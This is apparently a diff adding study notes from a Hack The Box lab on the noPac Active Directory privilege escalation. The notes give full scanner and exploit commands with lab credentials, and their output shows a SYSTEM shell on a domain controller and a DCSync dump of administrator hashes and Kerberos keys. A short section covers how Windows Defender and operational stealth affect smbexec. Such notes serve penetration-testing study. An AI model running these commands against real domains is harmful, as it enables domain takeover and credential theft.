@@ -17,6 +17,14 @@
     - [Workarounds](#workarounds)
       - [#1 PSCredential Object](#1-pscredential-object)
       - [#2 Register PSSession Configuration](#2-register-pssession-configuration)
+  - [Bleeding Edge Vulnerabilities](#bleeding-edge-vulnerabilities)
+    - [NoPac (_SamAccountName Spoofing_)](#nopac-samaccountname-spoofing)
+      - [Scanning for NoPac](#scanning-for-nopac)
+      - [Running NoPac \& Getting a Shell](#running-nopac--getting-a-shell)
+      - [Confirming the Location of Saved Tickets](#confirming-the-location-of-saved-tickets)
+      - [Using noPac to DCSync the Built-in Administrator Account](#using-nopac-to-dcsync-the-built-in-administrator-account)
+    - [Windows Defender \& SMBEXEC.py Considerations](#windows-defender--smbexecpy-considerations)
+    - [PrintNightmare](#printnightmare)
 
 ---
 
@@ -798,4 +806,124 @@ sapsso
 sapvc
 vmwarescvc
 ```
+
+## Bleeding Edge Vulnerabilities
+
+### NoPac (_SamAccountName Spoofing_)
+
+The [Sam_The_Admin vulnerability](https://techcommunity.microsoft.com/t5/security-compliance-and-identity/sam-name-impersonation/ba-p/3042699), also called noPac or referred to as SamAccountName Spoofing, encompasses two CVEs (_2021-42278 and 2021-42287_) and allows for intra-domain privesc from any standard domain user to Domain Admin level access in one single command.
+
+This exploit path takes advantage of being able to change the SamAccountName of a computer account to that of a Domain Controller. By default, authenticated users can add up to ten computers to a domain. When doing so, you change the name of the new host to match a DC's SamAccountName. Once done, you must request Kerberos tickets causing the service to issue you tickets under the DC's name instead of the new name. When a TGS is requested, it will issue the ticket with the closest matching name. Once done, you will have access as that service and can even be provided with a SYSTEM shell on a DC. The flow of the attack is outlined [here](https://www.secureworks.com/blog/nopac-a-tale-of-two-vulnerabilities-that-could-end-in-ransomware).
+
+You can use this [tool](https://github.com/Ridter/noPac) to perform the attack.
+
+NoPac uses many tools in Impacket to communicate with, upload a payload, and issue commands from the attack host to the target DC. Before attempting to use the exploit, you should ensure Impacket is installed and the noPac exploit repo is cloned to your attack host if needed.
+
+Once Impacket is installed and you ensure the repo is cloned to your attack box, you can use the scripts in the NoPac dir to check if the system is vulnerable using a scanner then use the exploit to gain a shell as NT AUTHORITY/SYSTEM. You can use the scanner with a standard domain user account to attempt to obtain a TGT from the target DC. If successful, this indicates the system is, in fact, vulnerable. You'll also notice the ms-DS-MachineAccountQuota number is set to 10. In some environments, an astute sysadmin may set the ms-DS-MachineAccountQuota value to 0. If this is the case, the attack will fail because your user will not have the rights to add a new machine account. Setting this to 0 can prevent quite a few AD attacks.
+
+#### Scanning for NoPac
+
+```bash
+d41y@htb[/htb]$ sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap
+
+███    ██  ██████  ██████   █████   ██████ 
+████   ██ ██    ██ ██   ██ ██   ██ ██      
+██ ██  ██ ██    ██ ██████  ███████ ██      
+██  ██ ██ ██    ██ ██      ██   ██ ██      
+██   ████  ██████  ██      ██   ██  ██████ 
+                                           
+[*] Current ms-DS-MachineAccountQuota = 10
+[*] Got TGT with PAC from 172.16.5.5. Ticket size 1484
+[*] Got TGT from ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL. Ticket size 663
+```
+
+#### Running NoPac & Getting a Shell
+
+There are many different ways to use NoPac to further your access. One way is to obtain a shell with SYSTEM level privileges. You can do this by running noPac.py with the syntax below to impersonate the built-in administrator account and drop into a semi-interactive shell session on the target DC. This could be "noisy" or may be blocked by AV or EDR.
+
+```bash
+d41y@htb[/htb]$ sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap
+
+███    ██  ██████  ██████   █████   ██████ 
+████   ██ ██    ██ ██   ██ ██   ██ ██      
+██ ██  ██ ██    ██ ██████  ███████ ██      
+██  ██ ██ ██    ██ ██      ██   ██ ██      
+██   ████  ██████  ██      ██   ██  ██████ 
+                                               
+[*] Current ms-DS-MachineAccountQuota = 10
+[*] Selected Target ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
+[*] will try to impersonat administrator
+[*] Adding Computer Account "WIN-LWJFQMAXRVN$"
+[*] MachineAccount "WIN-LWJFQMAXRVN$" password = &A#x8X^5iLva
+[*] Successfully added machine account WIN-LWJFQMAXRVN$ with password &A#x8X^5iLva.
+[*] WIN-LWJFQMAXRVN$ object = CN=WIN-LWJFQMAXRVN,CN=Computers,DC=INLANEFREIGHT,DC=LOCAL
+[*] WIN-LWJFQMAXRVN$ sAMAccountName == ACADEMY-EA-DC01
+[*] Saving ticket in ACADEMY-EA-DC01.ccache
+[*] Resting the machine account to WIN-LWJFQMAXRVN$
+[*] Restored WIN-LWJFQMAXRVN$ sAMAccountName to original value
+[*] Using TGT from cache
+[*] Impersonating administrator
+[*] 	Requesting S4U2self
+[*] Saving ticket in administrator.ccache
+[*] Remove ccache of ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
+[*] Rename ccache with target ...
+[*] Attempting to del a computer with the name: WIN-LWJFQMAXRVN$
+[-] Delete computer WIN-LWJFQMAXRVN$ Failed! Maybe the current user does not have permission.
+[*] Pls make sure your choice hostname and the -dc-ip are same machine !!
+[*] Exploiting..
+[!] Launching semi-interactive shell - Careful what you execute
+C:\Windows\system32>
+```
+
+You will notice that a semi-interactive shell session is established with the target using smbexec.py. Keep in mind with smbexec shells you will need to use exact paths instead of navigating the directory structure using ```cd```.
+
+#### Confirming the Location of Saved Tickets
+
+It is important to note that NoPac.py does save the TGT in the directory on the attack host where the exploit was run. You can use ```ls``` to confirm.
+
+```bash
+d41y@htb[/htb]$ ls
+
+administrator_DC01.INLANEFREIGHT.local.ccache  noPac.py   requirements.txt  utils
+README.md  scanner.py
+```
+
+#### Using noPac to DCSync the Built-in Administrator Account
+
+You could then use the ccache file to perform a PtT and perform further attacks such as DCSync. You can also use the tool with the ```-dump``` flag to perform a DCSync using secretsdumpy.py. This method would still create a ccache file on disk, which you would want to be aware of and clean up.
+
+```bash
+d41y@htb[/htb]$ sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator
+
+███    ██  ██████  ██████   █████   ██████ 
+████   ██ ██    ██ ██   ██ ██   ██ ██      
+██ ██  ██ ██    ██ ██████  ███████ ██      
+██  ██ ██ ██    ██ ██      ██   ██ ██      
+██   ████  ██████  ██      ██   ██  ██████ 
+                                                                    
+[*] Current ms-DS-MachineAccountQuota = 10
+[*] Selected Target ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
+[*] will try to impersonat administrator
+[*] Alreay have user administrator ticket for target ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
+[*] Pls make sure your choice hostname and the -dc-ip are same machine !!
+[*] Exploiting..
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+inlanefreight.local\administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::
+[*] Kerberos keys grabbed
+inlanefreight.local\administrator:aes256-cts-hmac-sha1-96:de0aa78a8b9d622d3495315709ac3cb826d97a318ff4fe597da72905015e27b6
+inlanefreight.local\administrator:aes128-cts-hmac-sha1-96:95c30f88301f9fe14ef5a8103b32eb25
+inlanefreight.local\administrator:des-cbc-md5:70add6e02f70321f
+[*] Cleaning up...
+```
+
+### Windows Defender & SMBEXEC.py Considerations
+
+If Windows Defender is enabled on a target, your shell session may be established, but issuing any commands will likely fail. The first thing smbexec.py does is create a service called "BTOBTO". Another service called "BTOBO" is created, and any command you type is sent to the target over SMB inside a .bat file called execute.bat. With each new command you type, a new batch script is created an echoed to a temporary file that executes said script and deletes it from the system.
+
+![ad extras 5](../../../../images/ad_extras5.png)
+
+If OPSEC or being "quiet" is a consideration during an assessment, you would most likely want to avoid a tool like smbexec.py.
+
+### PrintNightmare
 
